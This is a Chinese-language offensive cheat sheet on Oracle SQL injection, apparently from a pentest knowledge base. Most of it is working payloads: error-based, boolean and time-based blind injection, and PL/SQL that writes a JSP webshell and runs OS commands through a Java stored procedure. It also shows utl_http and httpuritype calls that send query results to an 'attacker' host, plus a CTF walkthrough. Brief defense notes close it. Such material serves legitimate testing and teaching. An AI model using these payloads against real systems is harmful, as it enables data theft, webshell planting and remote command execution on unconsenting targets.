# SQL 注入 Oracle

## 一句话理解
Oracle 注入与 MySQL 注入思路相通，但在语法、系统表、伪表、字符串拼接、时间盲注和报错利用方式上有明显差异，不能直接套用 MySQL payload。

## 常见差异
- Oracle 常用伪表是 `dual`
- 字符串拼接常用 `||`
- 没有 `limit`，常用 `rownum`
- 系统信息主要从 `user_tables`、`all_tables`、`dba_tables` 等视图获取
- 时间盲注、报错注入、网络外带方式与 MySQL 不同

## 常见危害
- 登录绕过
- 查询当前用户、版本、库对象
- 枚举表、列、数据
- 通过报错或时间差做无回显利用
- 在高权限和特定组件场景下做网络请求或更深层利用

## 基础探测
### 1. 判断是否进入 SQL 结构
常见探针：
- `'`
- `and 1=1`
- `and 1=2`

### 2. 用 `dual` 做表达式测试

```sql
SELECT 1 FROM dual
SELECT 'test' FROM dual
```

如果能注入子查询、条件表达式或 Union，后续利用空间会大很多。

## 常见枚举思路
### 1. 当前用户

```sql
select user from dual
```

### 2. 数据库版本

```sql
select banner from v$version
```

### 3. 当前用户可见表

```sql
select table_name from user_tables
select table_name from all_tables
```

### 4. 查询列名

```sql
select column_name from user_tab_columns where table_name='USERS'
```

> Oracle 中对象名默认常为大写，枚举时要特别注意大小写。

## Union 注入
### 1. 判断列数
可通过 `ORDER BY` 或逐步 `UNION SELECT` 判断字段数。

### 2. 注意类型匹配
Oracle 对 Union 两边的字段类型要求更严格，若原查询列类型不一致，往往需要显式构造：
- 字符串列
- 数值列
- `null` 占位

### 3. 常见写法

```sql
union select null,null from dual
union select 'a',null from dual
```

## 报错型注入
Oracle 也存在基于类型转换、XML 处理、函数异常等思路的报错利用，但具体利用函数受版本、权限和过滤器影响较大。

实战要点：
- 关注类型转换错误
- 关注 XML 相关函数报错
- 关注子查询返回行数异常
- 关注 `utl_inaddr`、`utl_http`、`extractvalue` 等是否可用

> 常见坑：网上流传的 `extractvalue(1,concat(0x7e,(select user from dual),0x7e))` 是 MySQL 风格写法，在 Oracle 中不可用：
> - Oracle 的 `concat()` 只接受 2 个参数，传 3 个参数报 `ORA-00909: invalid number of arguments`
> - Oracle 没有 `0x7e` 这种十六进制字符串字面量，报 `ORA-00911: invalid character`
> - Oracle 正确写法：用 `||` 拼接字符串，用 `chr(126)`（即 `~`）构造非法 XPath 触发报错

以下 payload 以数字型注入点 `?id=1` 为例，字符型注入点需自行闭合引号。

### 1. extractvalue（首选）
适用版本：9.2+ 引入；10g/11g 报错回显最稳定；12.2 起官方标记废弃，多数环境仍可触发。

```sql
-- 用非法 XPath（~ 开头）触发 ORA-31011，子查询结果随报错回显
and extractvalue(1,chr(126)||(select user from dual))
-- 等价写法：直接写 '~' 字符串
and extractvalue(1,'~'||(select user from dual))
```

- 报错形如 `ORA-31011: XML parsing failed ... ~SYS`，数据拼接在报错信息里
- 报错回显长度有限（通常只显示前 32~128 字符，因版本和驱动而异），长数据需配合 `substr` 分段

### 2. XMLType
适用版本：10g~12c 均可用；12c+ 部分环境报错内容被截断。

```sql
-- 构造含查询结果的非法 XML 片段，触发解析错误并回显数据
and (XMLType('<a>'||(select user from dual)||'</a>')).extract('//a') is not null
```

### 3. utl_inaddr.get_host_name
适用版本：10g 默认授予 PUBLIC 可直接用；11g/12c 起默认收回执行权限，需 DBA 显式授权。

```sql
-- 把查询结果当主机名去解析，解析失败报 ORA-29257，"主机名"（即数据）被回显在报错里
and utl_inaddr.get_host_name((select user from dual))='a'
```

- 报错形如 `ORA-29257: host SYS unknown`

### 4. ctxsys.drithsx.sn
适用版本：10g/11g/12c；依赖 Oracle Text 组件（标准安装默认包含），需要相应执行权限。

```sql
-- 第二个参数传入查询结果，触发 Oracle Text 报错 ORA-20000 并回显数据
and 1=ctxsys.drithsx.sn(1,(select user from dual))
```

- 报错形如 `ORA-20000: Oracle Text error:` 后跟数据
- 适合 `extractvalue` 被过滤时的备选

### 5. dbms_xdb_version.checkin / dbms_xdb_version.unversion
适用版本：10.2+/11g/12c；11g 中通常 PUBLIC 可执行。

```sql
-- 把查询结果当 XDB 资源路径传入，路径解析失败触发报错并回显数据
and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null

-- unversion 同理
and (select dbms_xdb_version.unversion((select user from dual)) from dual) is not null
```

### 报错注入通用技巧

```sql
-- 长数据分段读取（突破回显长度限制）
and extractvalue(1,chr(126)||substr((select banner from v$version where rownum=1),1,30))
and extractvalue(1,chr(126)||substr((select banner from v$version where rownum=1),31,30))

-- 多行数据翻页：Oracle 没有 limit，用 rownum + minus 取第 N 行
and extractvalue(1,chr(126)||(select table_name from user_tables where rownum<=2
  minus select table_name from user_tables where rownum<=1))
```

## Bool 型盲注
如果页面只存在真假差异，可用条件判断逐字符枚举。

例如判断首字符：

```sql
and ascii(substr((select user from dual),1,1))=83
```

## 时间型盲注
Oracle 常见思路是借助耗时函数、锁等待或网络请求形成时间差，和 MySQL 的 `sleep()` 思路不同。

实战重点：
- 关注 `dbms_lock.sleep`
- 关注网络函数与 DNS / HTTP 外带
- 关注是否可构造条件触发耗时逻辑

> 是否能直接调用相关包，强依赖数据库权限。

### 1. dbms_pipe.receive_message（首选）
适用版本：10g+；11g 中默认 PUBLIC 可执行，Amazon RDS 等受限云环境通常也保留。

```sql
-- 等待管道 'RDS' 的消息最多 5 秒，管道不存在则 5 秒后超时返回，形成精确延时
and 1=dbms_pipe.receive_message('RDS',5)
```

- 延时秒数精确可控，是 Oracle 时间盲注首选
- 无需 DBA 权限

### 2. 重查询笛卡尔积法（heavy query，无 dba 权限可用）
适用版本：全版本；只要能查 `all_users`（任何普通用户都能查）即可。

```sql
-- 三表自连接 all_users 产生立方级行数的笛卡尔积，count(*) 计算量剧增导致查询变慢
and 1=(SELECT count(*) FROM all_users a,all_users b,all_users c)
```

- 不依赖任何包权限，是普通用户的兜底方案
- 延时不可控，取决于表行数与机器性能；要加大延时可换行数更多的表（如 `all_objects`）或再加一个别名
- 对生产环境有负载风险，仅在靶场/授权测试中使用

### 3. dbms_lock.sleep（需授权）
适用版本：全版本；10g 起默认 PUBLIC 无执行权限，需 DBA 执行 `grant execute on dbms_lock to <user>`。

```sql
-- 精确延时 5 秒，未授权时报 PLS-00201 / ORA-06598
and 1=dbms_lock.sleep(5)
```

### 三种方式适用性对比

| 方式 | 延时精度 | 权限要求 | 适用场景 |
| --- | --- | --- | --- |
| `dbms_pipe.receive_message` | 秒级精确 | 11g 默认 PUBLIC 可执行 | 首选，含 RDS 等受限环境 |
| 重查询笛卡尔积 | 不可控 | 无需权限 | 无任何包权限时的兜底 |
| `dbms_lock.sleep` | 秒级精确 | 需显式授权 | 已被授权的环境 |

### 4. 盲注逐位 payload

```sql
-- 布尔盲注二分：判断 user 首字符 ascii 是否大于 64（'S' 为 83）
and ascii(substr((select user from dual),1,1))>64

-- 时间盲注逐位：条件为真延时 5 秒，为假立即返回
and (case when ascii(substr((select user from dual),1,1))>64
          then dbms_pipe.receive_message('RDS',5) else 0 end)=1
```

## 提权与文件操作
拿到高权限（DBA）账号或可执行 PL/SQL 的注入场景后，可以从读数据升级到写文件和命令执行。

> 前置认知：Oracle 普通 SQL 注入点默认不支持堆叠语句和匿名块。以下 PL/SQL 类 payload 需要：
> - 存在 PL/SQL 注入（输入被拼进 `EXECUTE IMMEDIATE`、存储过程等动态 SQL 场景）
> - 应用自带 SQL/脚本后台执行功能
> - 已通过其他途径拿到 sqlplus 等执行通道

### 1. utl_file 写文件（需权限，堆叠/PLSQL 注入场景）

```sql
-- ① 查看已有目录对象（fopen 第一个参数传 DIRECTORY 对象名，不是物理路径，且默认大写）
select * from all_directories;

-- ② 有 CREATE ANY DIRECTORY（DBA 常有）时，把目录对象指向 web 根
create or replace directory ISTO_DIR as '/opt/oracle/webapps/ROOT';

-- ③ 匿名块写 webshell（一句话内容按需替换）
declare
  f utl_file.file_type;
begin
  f := utl_file.fopen('ISTO_DIR','x.jsp','w');      -- 目录对象名/文件名/写模式
  utl_file.put_line(f,'<%out.print("pwn");%>');      -- 写入 JSP 一句话
  utl_file.fclose(f);
end;
```

- 需要 `utl_file` 执行权限 + 目录读写授权：`grant read,write on directory ISTO_DIR to <user>`
- web 根路径线索：`all_directories`、`v$dbfile`（数据文件路径可推 ORACLE_BASE）、中间件报错信息
- 写完访问 `http://target/x.jsp` 验证

### 2. Java Source 执行命令（DBA 权限，经典 RCE 模板）

```sql
-- ① 授予 Java 权限（把 SCOTT 替换成当前注入用户；程序化场景用 begin...end 包裹执行）
exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','writeFileDescriptor','');
exec dbms_java.grant_permission('SCOTT','SYS:java.lang.RuntimePermission','readFileDescriptor','');

-- ② 创建 Java 存储过程：执行系统命令并收集回显
create or replace and compile java source named "OSCmd" as
import java.io.*;
public class OSCmd {
  public static String exec(String cmd) throws Exception {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    StringBuilder sb = new StringBuilder();
    while ((line = br.readLine()) != null) { sb.append(line).append("\n"); }
    return sb.toString();
  }
};
/

-- ③ 包装成 PL/SQL 函数
create or replace function run_cmd(p_cmd varchar2) return varchar2
as language java
name 'OSCmd.exec(java.lang.String) return java.lang.String';
/

-- ④ 执行：普通单语句注入点也能直接 select 调用
select run_cmd('whoami') from dual;
```

- 说明：不存在 `dbms_java.runexec` 这个函数；11g+ 有 `dbms_java.runjava` 可一行执行 Java，但环境依赖强，经典通用方案仍是上面的 `grant_permission` + Java Source 模板
- `Runtime.exec(String)` 按空白切分参数，复杂命令（管道、重定向）需改用 `Runtime.exec(new String[]{...})` 数组重载

### 3. UTL_HTTP 带外（OOB）

```sql
-- 前提：utl_http 执行权限 + 11g 起 ACL 放行（否则报 ORA-24247）
-- 把查询结果拼进 URL 发起请求，实现数据外带
and (select utl_http.request('http://attacker:8000/'||(select user from dual)) from dual) is not null
```

- DNS/HTTP 外带完整手法见 [EXP-SQLi-OOB.md](EXP-SQLi-OOB.md)

### 4. HTTPURITYPE 读取与外带

```sql
-- utl_http 被过滤时的替代，同样受 ACL 限制（11g+）
select httpuritype('http://attacker:8000/'||(select user from dual)).getclob() from dual;

-- getshell 链路：写入 webshell 后，用 HTTPURITYPE 请求自身 web 服务，把命令执行结果"读"回来
select httpuritype('http://127.0.0.1:7001/x.jsp?cmd=whoami').getclob() from dual;
```

## 常见系统视图
- `user_tables`
- `all_tables`
- `dba_tables`
- `user_tab_columns`
- `all_tab_columns`
- `v$version`

理解权限边界很重要：
- `user_*`：当前用户拥有的对象
- `all_*`：当前用户可访问的对象
- `dba_*`：高权限视图

## 常见绕过思路
### 1. 语法差异绕过
把 MySQL 习惯改成 Oracle 语法：
- 用 `dual`
- 用 `||` 拼接字符串
- 用 `rownum` 控制条数

### 2. 过滤绕过
重点关注：
- 空格过滤
- 单引号过滤
- 关键字过滤
- 大小写或注释绕过

### 3. 无回显场景
优先看：
- 布尔回显
- 时间回显
- 报错信息
- 带外通道

## 实战排查思路
### 1. 先确认数据库类型
不要把 Oracle 当成 MySQL 直接打。

### 2. 先确认回显能力
区分：
- Union 可用
- 报错可用
- 真假回显
- 时间差回显

### 3. 再切到 Oracle 特有语法
重点替换：
- `limit` -> `rownum`
- 无表查询 -> `dual`
- 拼接方式 -> `||`

## 靶场与案例
一道典型 Oracle 报错注入 CTF 题完整流程。场景：`/news.jsp?id=1`，数字型注入，页面直接回显 ORA- 报错。

### Step 1：确认注入点与数据库类型

```sql
and 1=1                                  -- 页面正常
and 1=2                                  -- 页面异常 → 存在注入
'                                        -- 报 ORA-01756 → 引号进入 SQL 结构
and (select count(*) from dual)>0        -- dual 可查 → 确认 Oracle
```

报错带 `ORA-` 前缀即可确认是 Oracle，不要拿 MySQL payload 硬打。

### Step 2：报错注入拿基础信息

```sql
-- 当前用户，报错回显 ~SYS
and extractvalue(1,chr(126)||(select user from dual))
-- 版本信息，报错回显 ~Oracle Database 11g Enterprise Edition ...
and extractvalue(1,chr(126)||(select banner from v$version where rownum=1))
```

### Step 3：报错外带逐位（突破回显长度限制）

extractvalue 报错通常只回显前 30 个字符左右，长数据用 `substr` 分段拼接：

```sql
and extractvalue(1,chr(126)||substr((select banner from v$version where rownum=1),1,30))
and extractvalue(1,chr(126)||substr((select banner from v$version where rownum=1),31,30))
-- 依此类推 61,30 / 91,30 ...
```

### Step 4：枚举表、列、读数据

```sql
-- 表数量
and extractvalue(1,chr(126)||(select count(*) from user_tables))
-- 第 1 张表
and extractvalue(1,chr(126)||(select table_name from user_tables where rownum=1))
-- 第 2 张表：rownum + minus 翻页（Oracle 没有 limit）
and extractvalue(1,chr(126)||(select table_name from user_tables where rownum<=2
  minus select table_name from user_tables where rownum<=1))
-- 锁定 FLAG 表后查列名（对象名必须大写）
and extractvalue(1,chr(126)||(select column_name from user_tab_columns
  where table_name='FLAG' and rownum=1))
-- 读 flag（超长继续 substr 分段）
and extractvalue(1,chr(126)||substr((select flag from FLAG where rownum=1),1,30))
```

到这里 flag 已到手。若题目要求 getshell，继续 Step 5。

### Step 5：getshell 思路

```sql
-- 判断权限：能读 dba_* 视图说明当前用户是 DBA
and (select count(*) from dba_tables)>0
-- 枚举目录对象，找可写路径
and extractvalue(1,chr(126)||(select owner||':'||directory_name||':'||directory_path
  from all_directories where rownum=1))
```

- 有 DBA + 可执行 PL/SQL（后台 SQL 执行 / PLSQL 注入点）：走 `utl_file` 写 jsp webshell 或 Java Source 执行命令，见「提权与文件操作」
- 无 PL/SQL 执行场景：只能继续注入读数据，尝试 `UTL_HTTP`/`HTTPURITYPE` 带外，见 [EXP-SQLi-OOB.md](EXP-SQLi-OOB.md)

### 复盘要点
- 有报错回显时优先报错注入，效率远高于盲注；`extractvalue` 被过滤再换 `XMLType`/`drithsx.sn`/`dbms_xdb_version`
- 长数据一律 `substr` 分段，翻页一律 `rownum` + `minus`
- 对象名大写是高频翻车点
- 从数据到 RCE 的分水岭是权限 + PL/SQL 执行能力，先判断再动手

## 防御要点
### 1. 参数化查询
这依旧是 Oracle 注入最核心的防御手段。

### 2. 最小权限
数据库账号不应拥有过高权限，更不应开放危险网络包和管理包。

### 3. 关闭详细报错
避免把完整 SQL 异常、对象名、包名、版本信息暴露给前端。

### 4. 统一过滤不是根本方案
不要依赖字符串替换黑名单，应从预编译和 ORM 安全使用入手。

## 速查清单
- 先确认是 Oracle，再切换语法思路
- 先测 `dual`、`user`、`v$version`
- 先尝试 Union，再尝试报错、Bool、时间盲注
- 枚举 `user_*`、`all_*`、`dba_*` 视图
- 关注网络包、XML 函数、权限边界和带外通道

## Reference
- [Oracle 注入指北](https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/)
- [PayloadsAllTheThings - Oracle SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Oracle%20SQL%20Injection.md)
- [Oracle 官方文档 - SQL Language Reference (19c)](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/)
- [Oracle 官方文档 - PL/SQL Packages and Types Reference (19c)](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/)
- [Oracle 官方文档 - UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html)
- [Oracle 官方文档 - Java Developer's Guide（Java 存储过程与 DBMS_JAVA）](https://docs.oracle.com/en/database/oracle/oracle-database/19/jjdev/)
